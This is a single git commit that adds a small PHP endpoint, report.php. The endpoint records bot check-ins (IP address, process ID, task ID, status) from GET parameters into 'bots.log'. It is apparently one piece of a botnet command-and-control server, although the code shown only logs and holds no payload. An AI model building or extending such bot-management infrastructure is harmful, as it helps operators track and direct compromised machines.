a65a783e317575961d37a8a1b6f2f397b29a5f9a
TheEpicMiimikatz <theepicmimikatz@tutamail.com>
2026-05-28 19:46:08 +0000

    Create report.php

---
+++ server/api/report.php
@@ -0,0 +1,15 @@
+<?php
+
+if ($_SERVER['REQUEST_METHOD'] === 'GET') {
+    if (!isset($_COOKIE['.auth_id'])) {
+        header('Content-Type: application/json', true, 401);
+        echo json_encode(['status' => 'error', 'reason' => 'unauthorized']);
+        exit;
+    }
+
+    $pid = $_GET['proc_id'];
+    $task_id = $_GET['task_id'];
+    $status = $_GET['status'];
+
+    file_put_contents('bots.log', $_SERVER['REMOTE_ADDR'] . "status: $status task_id: $task_id process id: $pid\n");
+}
